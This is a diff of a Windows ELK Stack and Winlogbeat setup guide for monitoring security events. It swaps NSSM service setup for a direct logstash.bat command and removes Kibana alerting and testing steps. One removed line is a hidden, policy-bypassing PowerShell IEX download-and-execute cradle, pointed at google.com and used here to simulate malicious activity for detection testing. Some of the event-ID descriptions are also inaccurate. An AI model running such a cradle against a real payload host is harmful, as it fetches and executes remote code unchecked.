@@ -114,31 +114,11 @@ Setting up the ELK Stack (Elasticsearch, Logstash, Kibana) on a Windows system t
      ```
      Replace `your_elastic_password` with the Elasticsearch password, if you have any. No password needed for my device, just paste the above.
 
-3. **Install Logstash as a Service**:
-   - Download NSSM (Non-Sucking Service Manager) from [nssm.cc](https://nssm.cc/download) and extract it to `E:\Hacking\ELK Stack\nssm`.
-   - In PowerShell, navigate to the NSSM directory:
+     
+   - Run Logstash in CMD(Amdin):
      ```powershell
-     cd E:\Hacking\ELK Stack\nssm\win64
+     .\logstash.bat -f "C:\ELK\logstash-9.1.3\config\logstash.conf"
      ```
-   - Install Logstash as a service:
-     ```powershell
-     .\nssm.exe install logstash
-     ```
-   - In the NSSM GUI:
-     - Set the “Path” to `E:\Hacking\ELK Stack\logstash\bin\logstash.bat`.
-     - Set the “Startup directory” to `E:\Hacking\ELK Stack\logstash\bin`.
-     - In the “Arguments” field, enter:
-       ```
-       -f E:\Hacking\ELK Stack\logstash\config\logstash.conf
-       ```
-     - Click “Install service.”
-   - Start the service:
-     ```powershell
-     .\nssm.exe start logstash
-     ```
-
-4. **Verify Logstash**:
-   - Check the logs in `E:\Hacking\ELK Stack\logstash\logs` to ensure Logstash starts without errors and is listening on port 5044.
 
 #### **Step 4: Install and Configure Winlogbeat**
 1. **Download and Extract**:
@@ -192,42 +172,11 @@ Setting up the ELK Stack (Elasticsearch, Logstash, Kibana) on a Windows system t
    - Navigate to `http://localhost:5601` and log in with the `elastic` user and password.
 
 2. **Create an Index Pattern**:
-   - In Kibana, go to “Stack Management” > “Index Patterns.”
-   - Create a new index pattern for `winlogbeat-*`.
-   - Select `@timestamp` as the time field and create the pattern.
-
-3. **Set Up Dashboards for Security Threats**:
-   - Go to “Analytics” > “Discover” to view raw logs.
-   - Install the Winlogbeat dashboard for pre-built visualizations:
-     - In Kibana, go to “Stack Management” > “Kibana” > “Data Views” or “Dashboards.”
-     - Import the Winlogbeat dashboard from the [Elastic downloads page](https://www.elastic.co/downloads/beats/winlogbeat) or search for it in “Kibana Apps.”
+   - In Kibana, go to “Stack Management” > “Kibana” > “Data Views” > Create (name, index both will be `winlogbeat-*`)
+   - Import the Winlogbeat dashboard from the [Elastic downloads page](https://www.elastic.co/downloads/beats/winlogbeat) or search for it in “Kibana Apps.”
    - Use the dashboard to monitor security events like logon failures (Event ID 4625), new service installations (Event ID 4798), or suspicious PowerShell activity (Sysmon Event ID 3).
-
-4. **Configure Alerts for Security Threats**:
-   - In Kibana, go to “Security” or “Alerting” to create rules for detecting anomalies, such as:
-     - Multiple failed logon attempts (Event ID 4625).
-     - Suspicious network connections logged by Sysmon.
-   - Example rule: Create a query for `event.code: 4625` with a threshold of 5 occurrences in 10 minutes to trigger an alert.
-
-#### **Step 7: Test and Monitor**
-1. **Generate Test Events**:
-   - Trigger security events (e.g., failed logins or PowerShell commands) to ensure logs are captured.
-   - Example: Run a PowerShell command to simulate malicious activity:
-     ```powershell
-     powershell -exec bypass -nop -w hidden "IEX ((new-object net.webclient).downloadstring('https://www.google.com'))"
-     ```
-   - Check Kibana’s Discover tab for corresponding Sysmon logs (Event ID 3).
-
-2. **Monitor Dashboards**:
-   - Use the Winlogbeat dashboard to track event IDs, sources, and levels.
-   - Look for patterns like repeated logon failures or unusual process executions.
-
-3. **Optimize for Production**:
-   - Increase Elasticsearch heap size in `E:\Hacking\ELK Stack\elasticsearch\config\jvm.options` (e.g., `-Xms2g -Xmx2g` for 4 GB RAM).
-   - Set up log rotation to manage disk space.
-   - Consider a multi-node setup for high availability in production environments.
-
 ---
+
 
 
 
